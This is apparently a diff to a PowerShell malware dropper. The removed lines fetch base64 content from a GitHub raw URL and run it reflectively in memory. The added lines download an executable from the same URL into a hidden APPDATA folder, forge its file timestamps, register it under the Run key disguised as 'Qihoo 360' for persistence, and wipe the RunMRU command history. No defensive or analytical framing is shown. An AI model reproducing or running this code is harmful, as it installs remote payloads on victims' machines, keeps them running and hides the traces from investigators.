@@ -1,10 +1,22 @@
-$url = "https://raw.githubusercontent.com/mohamedali43/ps1/main/test.exe"
+$TargetPath = $env:APPDATA + "Data\0fdfe2b959c25a84db17412f08390864\obscurum.exe"
 
-$response = Invoke-WebRequest -Uri $url
+curl "https://raw.githubusercontent.com/mohamedali43/ps1/main/test.exe" -o $TargetPath
 
-$byteArray = [System.Convert]::FromBase64String($response.Content)
+(Get-Item $TargetPath).CreationTime=("4 July 2024 5:50:00")
+(Get-Item $TargetPath).LastWriteTime=("4 July 2024 5:50:00")
+(Get-Item $TargetPath).LastAccessTime=("16 July 2024 17:19:00")
 
-$assembly = [System.Reflection.Assembly]::Load($byteArray)
+$RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$Name = "Qihoo 360"
+New-ItemProperty -Path $RegistryPath -Name $Name -Value $TargetPath -PropertyType String -Force 
 
-$entryPoint = $assembly.EntryPoint
-$entryPoint.Invoke($null, @([string[]]@()))
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+$values = Get-ItemProperty -Path $regPath
+
+foreach ($valueName in $values.PSObject.Properties.Name) {
+    if ($valueName -ne "(default)")
+    {
+        Remove-ItemProperty -Path $regPath -Name $valueName -ErrorAction SilentlyContinue
+        echo $valueName
+    }
+}
